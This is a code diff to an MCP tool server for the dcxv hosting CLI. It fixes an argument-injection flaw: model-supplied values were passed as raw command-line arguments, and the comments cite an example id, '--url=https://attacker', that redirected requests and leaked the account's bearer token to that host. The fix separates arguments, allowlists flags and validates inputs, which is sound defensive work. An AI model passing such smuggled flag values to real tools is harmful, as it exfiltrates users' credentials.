@@ -9,10 +9,23 @@
 // graphql-sse and ws, and ships as a `bun build --compile` binary per platform).
 //
 // Tools are argv recipes run in-process through the SAME `run(argv, deps)` entry point
-// bin/dcxv.js uses — no command logic is duplicated, and no model-supplied argument
-// ever reaches a handler as raw argv; each tool builds its own fixed-shape argv array
-// from validated arguments and always appends --json, so the result is parsed JSON, not
-// a screen-scrape of colored text.
+// bin/dcxv.js uses — no command logic is duplicated — and always with --json, so the
+// result is parsed JSON, not a screen-scrape of colored text.
+//
+// Model-supplied values ARE argv here, so two things keep them from being read as flags
+// (cli.js's parse() is parseArgs with allowPositionals + strict:false, which honors an
+// option wherever it appears in the array, not just up front):
+//
+//   1. runJson() splits argv into `cmd` (tokens the tool itself writes) and `rest`
+//      (everything from the model), and emits them as `...cmd, '--', ...rest`. After
+//      `--` parseArgs stops interpreting options entirely, so a value like
+//      "--url=https://attacker" lands in positionals as that literal string.
+//   2. validateArgs() enforces each tool's own declared inputSchema — type, enum and
+//      pattern — before run() is reached, so such a value never gets that far.
+//
+// This used to claim "no model-supplied argument ever reaches a handler as raw argv",
+// which was simply untrue: `get_order {id: "--url=https://attacker"}` set the global
+// --url flag and sent the account's bearer token to that host.
 import { createInterface } from 'node:readline'
 import { run } from './cli.js'
 import { VERSION } from './version.js'
@@ -28,22 +41,34 @@ export function defaultStdioIo() {
   }
 }
 
+// The only flags a tool is allowed to put in its own `cmd` — everything `create_order`
+// needs, and nothing that redirects the request (--url) or switches account (--profile).
+// Anything else with a leading dash means a model value was passed as `cmd` instead of
+// `rest`, which is the bug this whole split exists to prevent.
+const TOOL_FLAGS = new Set(['--cluster', '--vcpu', '--ram', '--disk', '--ip', '--os', '--hostname', '--yes', '--price'])
+
 // Runs one CLI command in-process and returns its parsed --json output (or throws the
 // message dcxv would have printed to stderr on failure).
 //
-// ctx carries --url/--profile (if `dcxv mcp` was itself invoked with them) so every tool
-// call resolves the SAME account/host the server started against - otherwise each of
-// these recursive run() calls re-parses its own bare argv with no --url/--profile flag,
-// silently falling back to the default profile/host regardless of what `dcxv mcp` was
-// given. Bug caught live: `dcxv mcp --url <other-host>` still answered from the default
-// profile's account.
-async function runJson(ctx, argv) {
+//   cmd  - fixed tokens the tool itself writes: the subcommand plus its own flags. A
+//          model value may appear here ONLY as a flag's value (`--cluster 16`), which
+//          parseArgs consumes as a value even when it looks like an option.
+//   rest - model-supplied positionals. Emitted after `--`, where option parsing is off.
+//
+// --url/--profile are pinned on EVERY call, not just when `dcxv mcp` was invoked with
+// them, so each tool call resolves the SAME account/host the server started against.
+// Previously they were appended only if set, and only last-wins made an injected --url
+// lose; with a bare `dcxv mcp` there was nothing to append and the injected one won.
+// (The original bug this pinning was written for: `dcxv mcp --url <other-host>` still
+// answered from the default profile's account.)
+async function runJson(ctx, cmd, rest = []) {
+  const bad = cmd.find((a) => typeof a === 'string' && a.startsWith('-') && !TOOL_FLAGS.has(a))
+  if (bad !== undefined) throw new Error(`refusing to run: "${bad}" would be parsed as a flag`)
+
   const out = []
   const err = []
-  const fullArgv = [...argv]
-  if (ctx.url) fullArgv.push('--url', ctx.url)
-  if (ctx.profile) fullArgv.push('--profile', ctx.profile)
-  fullArgv.push('--json')
+  const fullArgv = ['--json', '--url', ctx.baseUrl, '--profile', ctx.profileName, ...cmd]
+  if (rest.length) fullArgv.push('--', ...rest.map(String))
   const code = await run(fullArgv, { ...ctx.deps, stdout: (s) => out.push(s), stderr: (s) => err.push(s) })
   if (code !== 0) throw new Error(err.join('\n') || 'command failed')
   const text = out.join('\n').trim()
@@ -55,6 +80,55 @@ function textResult(value) {
 }
 function errorResult(message) {
   return { content: [{ type: 'text', text: message }], isError: true }
+}
+
+// Shapes the CLI already assumes downstream, written down where they can be enforced:
+// handleGet/handleSet do Number(id) (cli.js), so a product id is digits and nothing else.
+const ID = '^[0-9]+$'
+// One DNS label or a dotted name; never starts with a dash, which is the whole point.
+const HOSTNAME = '^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$'
+// An OS name from list_os ("Ubuntu 24.04") or its numeric id.
+const OS_NAME = '^[A-Za-z0-9][A-Za-z0-9 ._/-]{0,63}$'
+// A public catalog productID. Not argv-bound (it goes through encodeURIComponent into a
+// URL path) — this is hygiene, not the injection fix.
+const CATALOG_ID = '^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$'
+
+const clip = (v) => { const s = String(v); return s.length > 60 ? s.slice(0, 57) + '...' : s }
+
+// Enforce the tool's OWN declared inputSchema before its run() is reached. The schema is
+// already sent to the model in tools/list; until now only `required` was checked, so
+// `enum` and every implied shape were documentation an agent could simply ignore — and
+// an ignored shape is what turned get_order's id into a --url override.
+//
+// Deliberately not a general JSON Schema implementation: only the keywords these tools
+// actually declare (type/enum/pattern), so there is nothing to get subtly wrong.
+function validateArgs(tool, args) {
+  const schema = tool.inputSchema || {}
+  const props = schema.properties || {}
+
+  const missing = (schema.required || []).filter((k) => args[k] === undefined || args[k] === null || args[k] === '')
+  if (missing.length) return `Missing required argument(s): ${missing.join(', ')}.`
+
+  for (const [key, spec] of Object.entries(props)) {
+    const v = args[key]
+    if (v === undefined || v === null) continue
+    const bad = (why) => `Invalid argument "${key}": ${why} (got ${JSON.stringify(clip(v))}).`
+
+    if (spec.type === 'boolean') {
+      if (typeof v !== 'boolean') return bad('must be true or false, not a string')
+      continue
+    }
+    if (spec.type === 'string') {
+      // A number where a string is declared is a normal agent slip, not an attack - the
+      // digits are equivalent once stringified, so coerce rather than reject.
+      if (typeof v === 'number' && Number.isFinite(v)) args[key] = String(v)
+      else if (typeof v !== 'string') return bad('must be a string')
+    }
+    const s = args[key]
+    if (spec.enum && !spec.enum.includes(s)) return bad(`must be one of: ${spec.enum.join(', ')}`)
+    if (spec.pattern && !new RegExp(spec.pattern).test(s)) return bad(`must match ${spec.pattern}`)
+  }
+  return null
 }
 
 // --- Public tools: no login required, plain fetch against dcxv-www's own published,
@@ -84,7 +158,7 @@ const PUBLIC_TOOLS = [
   {
     name: 'get_product',
     description: 'Get a single DCXV product by its stable id (productID). No login required.',
-    inputSchema: { type: 'object', properties: { id: { type: 'string' } }, required: ['id'] },
+    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: CATALOG_ID } }, required: ['id'] },
     run: async (args, { baseUrl }) => textResult(await fetchJson(baseUrl, `/catalog/products/${encodeURIComponent(args.id)}.json`)),
   },
   {
@@ -128,12 +202,12 @@ const READ_TOOLS = [
     inputSchema: {
       type: 'object',
       properties: {
-        id: { type: 'string', description: 'Product id, from list_orders' },
+        id: { type: 'string', pattern: ID, description: 'Product id, from list_orders' },
         action: { type: 'string', enum: ['ips', 'stats', 'snapshots', 'backups', 'iso', 'kubeconfig'] },
       },
       required: ['id'],
     },
-    run: async (args, ctx) => textResult(await runJson(ctx, ['get', String(args.id), ...(args.action ? [args.action] : [])])),
+    run: async (args, ctx) => textResult(await runJson(ctx, ['get'], [args.id, ...(args.action ? [args.action] : [])])),
   },
   {
     name: 'list_os',
@@ -165,30 +239,30 @@ const WRITE_TOOLS = [
     inputSchema: {
       type: 'object',
       properties: {
-        id: { type: 'string' },
+        id: { type: 'string', pattern: ID },
         action: { type: 'string', enum: ['start', 'stop', 'shutdown', 'reset', 'restart', 'reboot', 'pass'] },
       },
       required: ['id', 'action'],
     },
-    run: async (args, ctx) => textResult(await runJson(ctx, ['set', String(args.id), 'power', args.action])),
+    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'power', args.action])),
   },
   {
     name: 'rename_order',
     description: "Change a server's hostname label. Cosmetic only, does not charge the account.",
-    inputSchema: { type: 'object', properties: { id: { type: 'string' }, hostname: { type: 'string' } }, required: ['id', 'hostname'] },
-    run: async (args, ctx) => textResult(await runJson(ctx, ['set', String(args.id), 'rename', args.hostname])),
+    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID }, hostname: { type: 'string', pattern: HOSTNAME } }, required: ['id', 'hostname'] },
+    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'rename', args.hostname])),
   },
   {
     name: 'lock_order',
     description: 'Lock a server against changes (client-side lock, reversible with unlock_order).',
-    inputSchema: { type: 'object', properties: { id: { type: 'string' } }, required: ['id'] },
-    run: async (args, ctx) => textResult(await runJson(ctx, ['set', String(args.id), 'lock'])),
+    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID } }, required: ['id'] },
+    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'lock'])),
   },
   {
     name: 'unlock_order',
     description: 'Reverse lock_order.',
-    inputSchema: { type: 'object', properties: { id: { type: 'string' } }, required: ['id'] },
-    run: async (args, ctx) => textResult(await runJson(ctx, ['set', String(args.id), 'unlock'])),
+    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID } }, required: ['id'] },
+    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'unlock'])),
   },
 ]
 
@@ -204,13 +278,13 @@ const BILLING_TOOLS = [
     inputSchema: {
       type: 'object',
       properties: {
-        cluster: { type: 'string', description: 'Location id from list_clusters' },
-        vcpu: { type: 'string' },
-        ram: { type: 'string' },
-        disk: { type: 'string' },
-        ip: { type: 'string' },
-        os: { type: 'string', description: 'OS name from list_os' },
-        hostname: { type: 'string' },
+        cluster: { type: 'string', pattern: ID, description: 'Location id from list_clusters' },
+        vcpu: { type: 'string', pattern: ID },
+        ram: { type: 'string', pattern: ID },
+        disk: { type: 'string', pattern: ID },
+        ip: { type: 'string', pattern: ID },
+        os: { type: 'string', pattern: OS_NAME, description: 'OS name from list_os' },
+        hostname: { type: 'string', pattern: HOSTNAME },
         confirm: { type: 'boolean', description: 'Must be true to actually place the order and charge the account; otherwise this is a price check only.' },
       },
       required: ['cluster', 'vcpu', 'ram', 'disk', 'ip', 'os'],
@@ -225,8 +299,8 @@ const BILLING_TOOLS = [
   {
     name: 'renew_order',
     description: 'Renew a server immediately. Charges the account with no undo.',
-    inputSchema: { type: 'object', properties: { id: { type: 'string' } }, required: ['id'] },
-    run: async (args, ctx) => textResult(await runJson(ctx, ['set', String(args.id), 'renew'])),
+    inputSchema: { type: 'object', properties: { id: { type: 'string', pattern: ID } }, required: ['id'] },
+    run: async (args, ctx) => textResult(await runJson(ctx, ['set'], [args.id, 'renew'])),
   },
 ]
 
@@ -253,10 +327,12 @@ function jsonRpcError(id, code, message) {
 export async function runMcpServer(deps, flags, io) {
   const cfg = deps.config.loadConfig({ profile: flags.profile })
   const baseUrl = flags.url ? flags.url.replace(/\/+$/, '') : cfg.url
-  // url/profile threaded through to every runJson() call below (see its own comment) -
-  // without this, --url/--profile given to `dcxv mcp` only affected the token-presence
-  // check here and silently reverted to the default profile/host for every tool call.
-  const ctx = { deps, baseUrl, url: flags.url, profile: flags.profile }
+  // Host and profile resolved ONCE at startup and pinned onto every runJson() call below
+  // (see its own comment) - without this, --url/--profile given to `dcxv mcp` only
+  // affected the token-presence check here and silently reverted to the default
+  // profile/host for every tool call. cfg.profile is the resolved name (never empty),
+  // so this pins the account even when `dcxv mcp` was given no --profile at all.
+  const ctx = { deps, baseUrl, profileName: cfg.profile }
   const tools = toolsForFlags(flags)
   const byName = new Map(tools.map((t) => [t.name, t]))
 
@@ -284,16 +360,16 @@ export async function runMcpServer(deps, flags, io) {
       if (READ_TOOLS.includes(tool) || WRITE_TOOLS.includes(tool) || BILLING_TOOLS.includes(tool)) {
         if (!cfg.token) return write(jsonRpcResult(id, errorResult('Not logged in. Run "dcxv login" first.')))
       }
-      // inputSchema.required is otherwise descriptive-only - an agent that violates its own
-      // tool's declared schema (e.g. calls get_product with no id) would previously reach
-      // a real network request built from `undefined`, rather than failing fast locally.
+      // The declared inputSchema is otherwise descriptive-only - an agent that violates
+      // its own tool's schema (calls get_product with no id, or passes "--url=..." where
+      // a product id belongs) would previously reach a real request built from it,
+      // rather than failing fast locally. validateArgs also normalizes in place, so pass
+      // the SAME object to run() rather than re-reading params.arguments.
       const args = params?.arguments || {}
-      const missing = (tool.inputSchema.required || []).filter((k) => args[k] === undefined || args[k] === null || args[k] === '')
-      if (missing.length) {
-        return write(jsonRpcResult(id, errorResult(`Missing required argument(s): ${missing.join(', ')}.`)))
-      }
+      const invalid = validateArgs(tool, args)
+      if (invalid) return write(jsonRpcResult(id, errorResult(invalid)))
       try {
-        return write(jsonRpcResult(id, await tool.run(params?.arguments || {}, ctx)))
+        return write(jsonRpcResult(id, await tool.run(args, ctx)))
       } catch (e) {
         return write(jsonRpcResult(id, errorResult(e.message || String(e))))
       }
